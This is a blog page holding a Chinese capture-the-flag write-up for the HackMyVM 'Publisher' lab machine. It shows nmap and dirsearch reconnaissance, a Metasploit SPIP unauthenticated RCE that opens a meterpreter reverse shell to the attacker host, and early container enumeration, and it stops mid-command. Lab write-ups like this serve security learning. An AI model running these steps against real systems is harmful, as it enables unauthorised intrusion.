<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c16f7e2b105eef61.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c16f7e2b105eef61.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-7f638e1eccc821aa.js" defer=""></script><script src="/_next/static/uS_pXrRdGjyth3yLj87AK/_buildManifest.js" defer=""></script><script src="/_next/static/uS_pXrRdGjyth3yLj87AK/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMPublisher","contentHtml":"\u003ch1\u003ePublisher.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Publisher\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Publisher\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes: \u003cstrong\u003eI hope you will enjoy it.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e// 探测主机\nnmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e          \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 06:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00057\u003c/span\u003es latency).\nMAC Address: 0A:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00028\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e:3D:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00052\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:AB:D8:DE (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up.\n// 扫描端口\nnmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 06:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00069\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:AB:D8:DE (Oracle VirtualBox virtual NIC)\n// 扫描版本服务\nnmap -sT -sV -O -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e         \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 06:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00077\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003ep1 Ubuntu 4ubuntu0\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e ((Ubuntu))\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:AB:D8:DE (Oracle VirtualBox virtual NIC)\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003eX|\u003cspan class=\"hljs-number\"\u003e5.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e24.62\u003c/span\u003e seconds\n// 漏洞扫描\nnmap -script=vuln -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 06:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00077\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (reset)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e DOM based XSS.\n| http-internal-ip-disclosure: \n|_  Internal IP Leaked: \u003cspan class=\"hljs-number\"\u003e172.17\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\n| http-enum: \n|_  /images/: Potentially interesting directory w/ listing on '\u003c/span\u003eapache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e (ubuntu)\u003cspan class=\"hljs-string\"\u003e'\nMAC Address: 08:00:27:AB:D8:DE (Oracle VirtualBox virtual NIC)\n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e新装了DVWS尝试一下，结果和nmap扫描的差不多\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPublisher/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e渗透\u003c/h2\u003e\n\u003cp\u003e因为此只存在80端口和22端口，所以优先级： \u003ccode\u003e80\u003c/code\u003e \u003e\u003ccode\u003e22\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e访问一下\u003ccode\u003eweb\u003c/code\u003e页面，蛮复古的，发现内容都是在说\u003ccode\u003espip\u003c/code\u003e ，通过搜索发现是一个SPIP是一款开源的\u003ccode\u003eCMS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPublisher/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过点击页面功能没找到可以利用的，扫描一下目录，也是仅发现\u003ccode\u003eimages\u003c/code\u003e文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e -e php,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt\n[07:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  315B  - /images  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e/images/         \n[07:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  623B  - /images/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问一下 \u003ccode\u003e/images\u003c/code\u003e ，也没啥可以利用的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPublisher/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试查找\u003ccode\u003eSPIP\u003c/code\u003e的漏洞，发现\u003ccode\u003eSPIP\u003c/code\u003e发现严重的反序列化漏洞，可以命令执行（\u003cstrong\u003e\u003ccode\u003eCVE-2023-27372\u003c/code\u003e\u003c/strong\u003e）\u003c/p\u003e\n\u003cp\u003e直接利用\u003ccode\u003emsfconsole\u003c/code\u003e 一把梭\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e search spip\n\nMatching Modules\n================\n\n   \u003cspan class=\"hljs-comment\"\u003e#   Name                                             Disclosure Date  Rank       Check  Description\u003c/span\u003e\n   -   ----                                             ---------------  ----       -----  -----------\n   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e   exploit/multi/http/spip_bigup_unauth_rce         \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE\n   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e     \\_ target: PHP In-Memory                       .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e     \\_ target: Unix/Linux Command Shell            .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e     \\_ target: Windows Command Shell               .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e   exploit/multi/http/spip_porte_plume_previsu_rce  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-08-\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin\n   \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e     \\_ target: PHP In-Memory                       .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e     \\_ target: Unix/Linux Command Shell            .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e     \\_ target: Windows Command Shell               .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e   exploit/multi/http/spip_connect_exec             \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e-07-04       excellent  Yes    SPIP connect Parameter PHP Injection\n   \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e     \\_ target: PHP In-Memory                       .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e    \\_ target: Unix/Linux Command Shell            .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e    \\_ target: Windows Command Shell               .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e  exploit/multi/http/spip_rce_form                 \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e       excellent  Yes    SPIP form PHP Injection\n   \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e    \\_ target: PHP In-Memory                       .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e    \\_ target: Unix/Linux Command Shell            .                .          .      .\n   \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e    \\_ target: Windows Command Shell               .                .          .      .\nmsf6 \u003e use \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\n// kali IP\nsf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\nlhost =\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\nrhost =\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e targeturi /spip\ntargeturi =\u003e /spip\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e run\n\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e \n[*] Running automatic check (\u003cspan class=\"hljs-string\"\u003e\"set AutoCheck false\"\u003c/span\u003e to disable)\n[*] SPIP Version detected: \u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n[+] SPIP version \u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e vulnerable.\n[*] Bigup plugin version detected: \u003cspan class=\"hljs-number\"\u003e3.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n[+] The target appears to be vulnerable. Both the detected SPIP version (\u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e bigup version (\u003cspan class=\"hljs-number\"\u003e3.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e) are vulnerable.\n[*] Found formulaire_action: login\n[*] Found formulaire_action_args: CKNOtIY6q36fgXbnaOw3p...\n[*] Preparing to send exploit payload to the target...\n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e40004\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56446\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e -0500\n\nmeterpreter \u003e \n\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e后渗透\u003c/h2\u003e\n\u003cp\u003e本来是想获得\u003ccode\u003eshell\u003c/code\u003e后获得更好的交互而使用\u003ccode\u003epython\u003c/code\u003e却发现没有\u003ccode\u003epython\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e先手动收集信息，发现\u003ccode\u003edockerenv\u003c/code\u003e ，现在的\u003ccode\u003eshell\u003c/code\u003e应该是docker下的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecd /\nls -al\ntotal \u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Dec \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e .\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Dec \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e ..\n-rwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e Dec \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e .dockerenv\nlrwxrwxrwx   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Oct  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e -\u003e usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\ncat /proc/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/cgroup\n\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:cpuset:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan 